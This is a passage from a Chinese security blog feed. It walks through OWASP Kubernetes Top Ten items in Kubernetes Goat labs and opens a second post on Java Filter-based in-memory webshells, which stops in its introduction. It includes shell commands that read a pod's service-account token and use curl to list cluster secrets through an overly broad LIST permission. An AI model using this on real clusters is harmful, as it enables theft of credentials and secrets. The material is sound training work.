rbac.authorization.k8s.io/v1</span><br><span class="line"># This cluster role binding allows anyone in the &quot;manager&quot; group to read secrets in any namespace.</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: read-secrets-global</span><br><span class="line">subjects:</span><br><span class="line">- kind: Group</span><br><span class="line">  name: manager # Name is case sensitive</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">roleRef:</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: secret-reader</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br></pre></td></tr></table></figure><p>回到问题本身。具体地，官方也给出了三个错误的案例：</p><ul><li><p>不必要的最高权限<code>cluster-admin</code>（Unnecessary use ofcluster-admin）</p><p>如下，将默认的最高权限用户<code>cluster-admin</code>的<code>ClusterRole</code>身份以<code>ClusterRoleBinding</code>的方式授权给了默认命名空间内的所有资源。假设一个default空间内的pod被攻陷了，那么将直接拥有集群最高的权限。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"> <span class="attr">name:</span> <span class="string">redacted-rbac</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">   <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">   <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line"> <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"> <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"> <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure></li><li><p>不必要的<code>LIST</code>权限（Unnecessary use of LISTpermission）</p><p>官方在官网中给了一段场景示例，关键部分：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kubectl create serviceaccount only-list-secrets-sa</span><br><span class="line">kubectl create role only-list-secrets-role --verb=list --resource=secrets</span><br><span class="line">kubectl create rolebinding only-list-secrets-default-ns \</span><br><span class="line">  --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个秘密</span></span><br><span class="line">kubectl create secret generic abc --from-literal=secretAuthToken=verySecure123</span><br></pre></td></tr></table></figure><p>首先创建了一个服务账户<code>only-list-secrets-sa</code>并创建了包含<code>LIST</code>权限的<code>only-list-secrets-role</code>，然后创建了名为<code>noly-olist-secrest-default-ns</code>的<code>rolebingding</code>将<code>only-list-secrets-role</code>授予了默认命名空间内的服务账户<code>only-list-secrets-sa</code>。</p><p>由于该服务账户没有<code>GET</code>权限，因此可以验证无法读取秘密：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920121608994.png" /></p><p>然而由于<code>LIST</code>权限的存在，使得可以列出所有的信息：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920121644503.png" /></p><p>由于创建<code>Role</code>时候增加了<code>list</code>权限，从而导致攻击者可以利用该权限列出对应命名空间内所有数据：</p><blockquote><p>Accounts with <code>LIST</code> permission cannot get a specific itemfrom the API, but will get all of them in full when they list.</p></blockquote></li><li><p>不必要的<code>WATCH</code>权限（Unnecessary use of WATCHpermission）</p><p>和<code>LIST</code>类似，<code>WATCH</code>也可以查看所有数据：</p><blockquote><p>kubectl create role only-watch-secrets-role --verb=watch--resource=secrets</p></blockquote></li></ul><h3id="对应k8s-goat场景rbac-least-privileges-misconfiguration">对应k8s-goat场景：RBACleast privileges misconfiguration</h3><blockquote><p>该攻击方法从战术上属于<code>Credential Access</code>，技术上包含<code>List K8S secrets</code>和<code>Container service account</code>。</p></blockquote><p>下面正式分析，首先访问对应端口：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920154727364.png" /></p><p>是一个网页版的shell，对应命名空间<code>big-monolith</code>下的应用<code>hunger-check</code>。根据场景介绍，我们的目标是获取<code>k8s_goat_flag</code>，其位于<code>k8svaultapikey</code>中。</p><h3 id="预备知识">预备知识</h3><p>对于k8s环境中存在的pod，我们怎么从pod内部使用到k8s的API呢？官方提供了四种方式。</p><ul><li><p>使用官方的k8s客户端：类似DIND，可以下载使用官方的k8s客户端。</p></li><li><p>直接访问RESTful API：</p><ul><li><p>环境变量中存在<code>KUBERNETES_SERVICE_HOST</code>和<code>KUBERNETES_SERVICE_PORT_HTTPS</code>。且k8s也在集群中部署了名为<code>kubernetes</code>的服务，提供<code>kubernetes.default.svc</code>到API服务器的域名解析服务。</p></li><li><p>官方推荐使用<code>ServiceAccount</code>来认证使用API，如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义ServiceAccount</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">build-robot</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ServiceAccont定义pod</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-pod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">serviceAccountName:</span> <span class="string">build-robot</span></span><br></pre></td></tr></table></figure><p>若以这种方式，则k8s会在pod中创建：</p><ul><li><code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>：认证token</li><li><code>/var/run/secrets/kubernetes.io/serviceaccount/ca.crt</code>：证书</li><li><code>/var/run/secrets/kubernetes.io/serviceaccount/namespace</code>：使用API时默认的namespace</li></ul><p>这种情况下，pod内容器就可以使用配置文件定义好的<code>ServiceAccount</code>权限去访问<code>kubernetes.default.svc</code>了。</p></li></ul></li><li><p>使用kubectl proxy：使用该命令开启一个sidecar模式的pod，kubectlproxy在pod内开启一个监听端口并负责与API服务器进行认证，因而该pod内的所有容器就可以通过该端口访问API服务了</p></li><li><p>直接传递认证token：和第二种有点类似，只不过我们是手动传递的token，一个简单脚本如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置API服务器的域名，域名解析会由kubernets服务执行</span></span><br><span class="line">APISERVER=https://kubernetes.default.svc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置ServiceAccount文件的路径</span></span><br><span class="line">SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取Pod的namespace、token、证书</span></span><br><span class="line">NAMESPACE=$(cat $&#123;SERVICEACCOUNT&#125;/namespace)</span><br><span class="line">TOKEN=$(cat $&#123;SERVICEACCOUNT&#125;/token)</span><br><span class="line">CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问api</span></span><br><span class="line">curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api</span><br></pre></td></tr></table></figure></li></ul><h3 id="利用-2">利用</h3><p>那先找k8sapi的服务器地址嘛，不然怎么用API。从环境变量中可以看到：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920154850178.png" /></p><p>好，可以用，但是我们怎么知道这个pod对应的服务账号呢？这里选用前述预备知识中<strong>直接传递认证token</strong>的方式。进入<code>/var/run/</code>目录可以看到一个<code>secrets</code>目录，其下就是token、证书和默认namespace了：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920154914501.png" /></p><p>然后我们基于这三个内容以及前面环境变量中看到的地址来访问API：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920155154243.png" /></p><p>可以看到访问成功，<code>curl --cacert $&#123;CACRT&#125; --header "Authorization: Bearer $&#123;TOKEN&#125;" -X GET $&#123;APISERVER&#125;/api/v1</code>查看有哪些资源：</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920153859379.png" style="zoom:60%;" /></p><p>可以找到一个叫<code>secrets</code>的资源，尝试访问<code>curl --cacert $&#123;CACRT&#125; --header "Authorization: Bearer $&#123;TOKEN&#125;" -X GET $&#123;APISERVER&#125;/api/v1/secrets</code>：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920155612132.png" /></p><p>不能直接访问，但发现该资源拥有list和watch权限，那么就想到了利用list或watch的方法来读取全部信息，这里使用list。<strong>在v1后加上命名空间的路径，即v1/namespace/${NAMESPACE}/secrets</strong>：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920155724794.png" /></p><p><strong>可以看到，我们虽然没有权限访问secrets下的某个条目，但是我们可以利用LIST直接把所有信息都列举出来</strong>，最后找到题目所需关键字并解码：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920160129910.png" /></p><blockquote><p>更多k8s RESTful API的使用：<ahref="https://kubernetes.io/docs/reference/kubernetes-api/">KubernetesAPI | Kubernetes</a></p></blockquote><h3 id="问题原因-2">问题原因</h3><p>去看一下配置文件：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920160901020.png" /></p><h3 id="参考学习-2">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster/welcome">⎈RBAC least privileges misconfiguration | Kubernetes Goat(madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K03-overly-permissive-rbac">K03:Overly Permissive RBAC | OWASP Foundation</a></li><li><ahref="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">UsingRBAC Authorization | Kubernetes</a></li><li><ahref="https://kubernetes.io/docs/concepts/security/rbac-good-practices/">RoleBased Access Control Good Practices | Kubernetes</a></li><li><ahref="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/">Accessingthe Kubernetes API from a Pod | Kubernetes</a></li><li><ahref="https://kubernetes.io/docs/reference/kubernetes-api/">KubernetesAPI | Kubernetes</a></li></ul><h2 id="k04-lack-of-centralized-policy-enforcement">K04: Lack ofCentralized Policy Enforcement</h2><h3 id="定义-3">定义</h3><p>由于安全策略的管理位于一个中心实体，因而难以在资源数量（<strong>k8s集群、云服务器</strong>）过于庞大的情况下、分发和强制性执行安全策略。</p><p>针对上述问题，<strong>k8s策略强制实施机制（Kubernetes policyenforcement）</strong>可以通过少量的配置就实现在多个集群、多个云的基础设施上实现：管理（governance）、实施（compliance）和安全配置（securityrequireents）。</p><p>如下是一个来自<code>gatekeeper</code>的<strong>拒绝来自不可信的镜像源的镜像的配置文件：</strong><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Allowed repos</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">constraints.gatekeeper.sh/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">K8sAllowedRepos</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">allowed-repos</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">match:</span></span><br><span class="line">    <span class="attr">kinds:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">        <span class="attr">kinds:</span> [<span class="string">&quot;Pod&quot;</span>]</span><br><span class="line">    <span class="attr">namespaces:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;sbx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prd&quot;</span></span><br><span class="line">  <span class="attr">parameters:</span></span><br><span class="line">    <span class="attr">repos:</span><span class="comment"># 只允许来自如下两个镜像源的镜像</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;open-policy-agent&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;ubuntu&quot;</span></span><br></pre></td></tr></table></figure></p><p>此外，这类配置资源方案（其他的如Kyverno、Kubewarden等）还可以确保<strong>已经发生错误配置的pod不会被集群继续调度产生。</strong>比如Deployment。</p><h3id="对应k8s-goat场景securing-kubernetes-clusters-using-kyverno-policy-engine">对应k8s-goat场景：SecuringKubernetes Clusters using Kyverno Policy Engine</h3><p>下图为官方的攻击场景示意图，初步判断该通过名为<code>Kyverno</code>的策略引擎抵挡了攻击者对<code>valut</code>命名空间内的pod的命令执行请求。</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/scenario-22-1d2c06a0672c48504caadc55568323d4.png" /></p><h3 id="预备知识-1">预备知识</h3><p>首先需要了解什么是k8s中的准入控制器——<em>dynamic admissioncontroller:</em></p><blockquote><p><em>An admission controller is a piece of code that interceptsrequests to the Kubernetes API server prior to persistence of theobject, but after the request is authenticated and authorized.</em>——<ahref="https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/">AdmissionControllers Reference | Kubernetes</a></p></blockquote><p>等于是一个拦截请求并对其进行认证的拦截器，可以拦截的请求动作包括：</p><ul><li>create、delete、modify或其他自定义的动词（如通过kubeproxy连接pod）</li></ul><p>但也包括一些不能够拦截的动作：</p><ul><li>get、watch、list</li></ul><p>其具体的动作包括：</p><ul><li>validating：<strong>并行</strong>调用所有的验证的webhook，只要有一个不通过就不通过</li><li>mutating：<strong>串行</strong>调用所有修改的webhook，挨个修改该请求</li><li>both：混合前两者</li></ul><blockquote><p>关于Kyverno（希腊语，意味<code>Govern</code>） —— Kyverno is a policyengine designed for Kubernetes.</p><p>Github: <a href="https://github.com/kyverno/kyverno">kyverno/kyverno:Kubernetes Native Policy Management (github.com)</a></p></blockquote><p>而Kyverno可以作为k8s集群的<strong>动态准入控制器</strong>（<em>dynamicadmission controller</em>），可以通过Helm包管理器进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加chart源</span></span><br><span class="line">helm repo add kyverno https://kyverno.github.io/kyverno/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新并安装</span></span><br><span class="line">helm repo update</span><br><span class="line">helm install kyverno kyverno/kyverno -n kyverno --create-namespace</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果要卸载也很简单</span></span><br><span class="line">helm uninstall kyverno kyverno/kyverno -n kyverno</span><br></pre></td></tr></table></figure><p>安装结果：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230922201052379.png" /></p><p>安装结束后，就可以通过编写<code>yaml</code>的格式来定义策略了。官方有详尽的指南：<ahref="https://kyverno.io/docs/kyverno-policies/">Policies and Rules |Kyverno</a>。Kyverno可以定义集群范围的策略<code>ClusterPolicy</code>或指定命名空间内的策略<code>Policy</code>，而具体的结构可以用下面的一张图来概括：</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/Kyverno-Policy-Structure.png" style="zoom:60%;" /></p><h3 id="使用">使用</h3><p>这里主要学习如何编写Kyverno策略配置文件，禁止用户使用exec命令进入指定容器。</p><blockquote><p>kubectl apply -fhttps://raw.githubusercontent.com/madhuakula/kubernetes-goat/master/scenarios/kyverno-namespace-exec-block/kyverno-block-pod-exec-by-namespace.yaml</p></blockquote><p>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: kyverno.io/v1</span><br><span class="line">kind: ClusterPolicy</span><br><span class="line">metadata:</span><br><span class="line">  name: deny-exec-in-vault-namespace</span><br><span class="line">  annotations:</span><br><span class="line">    policies.kyverno.io/title: Block Pod Exec in Vault Namespace</span><br><span class="line">    policies.kyverno.io/category: Sample</span><br><span class="line">    policies.kyverno.io/minversion: 1.6.0</span><br><span class="line">    policies.kyverno.io/subject: Pod</span><br><span class="line">    policies.kyverno.io/description: &gt;-</span><br><span class="line">      The `exec` command may be used to gain shell access, or run other commands, in a Pod&#x27;s container. While this can be useful for troubleshooting purposes, it could represent an attack vector and is discouraged to use in the `vault` namespace. This policy blocks Pod exec commands to Pods in a Namespace called `vault`.</span><br><span class="line">spec:</span><br><span class="line">  validationFailureAction: Enforce</span><br><span class="line">  background: false</span><br><span class="line">  rules:</span><br><span class="line">  - name: deny-exec-ns-vault</span><br><span class="line">    match:# 定义匹配规则</span><br><span class="line">      any:</span><br><span class="line">      - resources:</span><br><span class="line">          kinds:</span><br><span class="line">          - Pod/exec</span><br><span class="line">    preconditions:</span><br><span class="line">      all:</span><br><span class="line">      - key: &quot;&#123;&#123; request.operation || &#x27;BACKGROUND&#x27; &#125;&#125;&quot;</span><br><span class="line">        operator: Equals</span><br><span class="line">        value: CONNECT</span><br><span class="line">    validate:</span><br><span class="line">      message: 🚨 Pods in vault namespace should not be exec&#x27;d into. It has Kubernetes Goat 🐐 secrets 🔥</span><br><span class="line">      deny:# 拒绝策略</span><br><span class="line">        conditions:</span><br><span class="line">          any:</span><br><span class="line">          - key: &quot;&#123;&#123; request.namespace &#125;&#125;&quot;</span><br><span class="line">            operator: Equals</span><br><span class="line">            value: vault</span><br></pre></td></tr></table></figure><p>此时我们访问就会拒绝了：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230924141030991.png" /></p><blockquote><p>此外，Kyverno官方也提供了很多这样的策略例子供我们选择，<ahref="https://kyverno.io/policies/">Policies | Kyverno</a></p></blockquote><h3 id="参考学习-3">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-22/securing-kubernetes-clusters-using-kyverno-policy-engine/welcome">⎈Securing Kubernetes Clusters using Kyverno Policy Engine | KubernetesGoat (madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K04-policy-enforcement">K04:Policy Enforcement | OWASP Foundation</a></li><li><a href="https://kyverno.io/policies/">Policies | Kyverno</a></li></ul><h2 id="k05-inadequate-logging-and-monitoring">K05: Inadequate Loggingand Monitoring</h2><h3 id="定义-4">定义</h3><p>这部分也是工具的学习。在k8s中，一些事件默认是不会出现在日志中或者被监控，包括：</p><ul><li>认证失败、敏感资源访问、手动删除或修改k8s资源</li><li>运行中负载的日志</li></ul><p>此外，没有开启日志记录、日志有没有被集中存储且是否可以实现防篡改、报警阈值设置是否合理。上述情况或问题都可能会导致攻击者的行径没有被记录下来，从而对溯源造成了困难。因此OWASP建议如下类型日志都应开启并合理配置：</p><ul><li>k8s审计日志：记录API调用</li><li>k8s事件：记录资源状态的更改和错误</li><li>应用&amp;容器日志：容器内部运行的应用程序自行记录应用程序的日志</li><li>操作系统日志：如<code>journalctl</code>命令</li><li>云提供商日志</li><li>网络日志</li></ul><h3id="对应k8s-goat场景cilium-tetragon---ebpf-based-security-observability-and-runtime-enforcement">对应k8s-goat场景：CiliumTetragon - eBPF-based Security Observability and RuntimeEnforcement</h3><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/scenario-21-f6224cb07df8c572137cd371e26c1d42.png" /></p><h3 id="使用-1">使用</h3><blockquote><p>Tetragon是一个基于eBPF技术的运行时安全检测组件，具有如下特点：</p><ul><li>实时性：Tetragon is a runtime security enforcement and observabilitytool. What this means is Tetragon applies policy and filtering directlyin eBPF in the kernel.</li><li>灵活性：Tetragon can hook into any function in the Linux kernel andfilter on its arguments, return value, associated metadata that Tetragoncollects about processes (e.g., executable names), files, and otherproperties.</li><li>内核信息可读：Tetragon, through eBPF, has access to the Linux kernelstate.</li></ul></blockquote><p>安装依然直接使用helm安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加软件源</span></span><br><span class="line">helm repo add cilium https://helm.cilium.io</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新并安装</span></span><br><span class="line">helm repo update &amp;&amp; helm install tetragon cilium/tetragon -n kube-system</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查tetragon的pod状态</span></span><br><span class="line">kubectl rollout status -n kube-system ds/tetragon -w</span><br></pre></td></tr></table></figure><p>安装结果：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20231002190521896.png" /></p><p>具体Tetragon的使用方法、原理这里不做赘述，官方文档：<ahref="https://tetragon.cilium.io/docs/overview/">Overview | Tetragon(cilium.io)</a>。下图为Tetragon架构示意图：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/smart_observability.png" /></p><h3 id="参考学习-4">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-21/ebpf-runtime-security-monitoring-and-detection-in-kubernetes-cluster-using-cilium-tetragon/welcome">⎈Cilium Tetragon - eBPF-based Security Observability and RuntimeEnforcement | Kubernetes Goat (madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K05-inadequate-logging">K05:Inadequate Logging | OWASP Foundation</a></li><li><a href="https://tetragon.cilium.io/docs/overview/">Overview |Tetragon (cilium.io)</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;之前入门学习了k8s集群环境的搭建和基本概念包括框架、网络模型，部署与动态扩展服务的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.f10at.cn/posts/eed4a979.html&quot;&gt;Kubernetes
集群环境搭建使用及问题记录（一）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
href=&quot;https://www.f10at.cn/posts/a08eb123.html&quot;&gt;Kubernetes-集群环境搭建使用及问题记录（二）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
href=&quot;https://www.f10at.cn/posts/ed901271.html&quot;&gt;Kubernetes-集群环境搭建使用及问题记录（三）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;回归安全的课题上来，云安全本质上是传统安全在云原生环境下的重新思考。作为业内事实标准，k8s可以提供服务管理、扩容等诸多功能，是提供云原生能力的基石。&lt;/p&gt;
&lt;p&gt;因此后面计划首先学习云安全分支下的k8s安全，并同时学习docker中的常见安全问题。这篇先学习&lt;a
href=&quot;https://owasp.org/www-project-kubernetes-top-ten/&quot;&gt;OWASP
Kubernetes Top Ten&lt;/a&gt;的前五个。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917222234007.png&quot; style=&quot;zoom:60%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="云安全" scheme="https://lzwgiter.github.io/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Kubernete" scheme="https://lzwgiter.github.io/tags/Kubernete/"/>
    
    <category term="云安全" scheme="https://lzwgiter.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java内存马原理（一）</title>
    <link href="https://lzwgiter.github.io/posts/c16d1cd9.html"/>
    <id>https://lzwgiter.github.io/posts/c16d1cd9.html</id>
    <published>2023-08-08T08:05:17.000Z</published>
    <updated>2023-08-15T12:51:28.026Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇主要学习针对Java容器的内存马技术，即无文件webshell，由于这些容器运行在内存中，因而也难以检测。Java容器的内存马大体上可以分为：</p><ul><li>Servlet型</li><li>Instrument型</li></ul><p>本篇具体内容为Tomcat容器下的Servlet型中的Filter内存马原理和利用方法，另外两个类型原理和Filter类似。Tomcat版本为10。（关于<ahref="https://lzwgiter.github.io/posts/b92dbb83.html">Servlet</a>）。</p><p><img src="/img/Java内存马原理（一）/e38ce0bab38f1b8757931db3f5dd7a8b.jpeg" style="zoom:70%;" /></p></blockquote><span id="more"></span><h1 id="什么是无文件webshell">什么是无文件webshell？</h1><p>随着流量分析、EDR等技术的逐步发展，传统的比如文件上传绕过检测来投放<strong>文件型webshell</strong>的手段已经不大行了，比如我们常见的一句话木马配合菜刀、冰蝎等，这些都需要将<code>.php</code>、<code>.jsp</code>等这种<strong>后门文件</strong>上传到目标机器上。然而在机器学习技术的加持下，单纯这类文件的检测已经非常容易了，因此出现了<strong>无文件webeshell</strong>的需求。</p><p>其核心原理：</p><blockquote><p>利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门</p></blockquote><p>无论是传统的Tomcat还是现行的Spring，他们底层上对用户请求的接收和处理，都会使用到<strong>Servlet技术</strong>，这是JavaWeb的根。Servlet技术为我们提供了一些经典的组件——换言之即<strong>利用方式</strong>：<strong>Servlet、Filter、Listener</strong>。</p><p>因而Java无文件webshell攻击的分类，也就可以从两个技术角度去分类（抛开框架）：</p><ul><li>基于Servlet or Filter or Listener。动态地创建上述对象并RCE；</li><li>利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码实现RCE；</li></ul><p>思想上无文件webshell其实我个人理解与传统的代码注入攻击是相似的。后者通过提前准备数据、创建remote线程、操作合法进程内存空间并执行恶意代码来实现。这个过程在内存中发生，我们的目的就是<strong>在一个合法进程中执行恶意代码</strong>。</p><p>反观无文件webshell是类似的，我们同样要<strong>进入</strong>一个用户请求的处理流程（一般为线程处理）、让这个流程中“动态的”插入我们的恶意代码并执行、并通过网络请求参数等办法操纵。整个过程和代码注入是很相似的。</p><p>下面以Tomcat10.1.11为例子，结合CC利用链讨论一下攻击原理和利用过程。</p><h1 id="关于servlet">关于Servlet</h1><p>更多关于Servlet的开发细节可以移步我的文章：<ahref="https://lzwgiter.github.io/posts/b92dbb83.html">JavaEE基础 -Servlet · float's blog (lzwgiter.github.io)</a></p><p>Servlet的角色和流程如下：</p><p><imgsrc="/img/Java内存马原理（一）/image-20230504144857382.png" 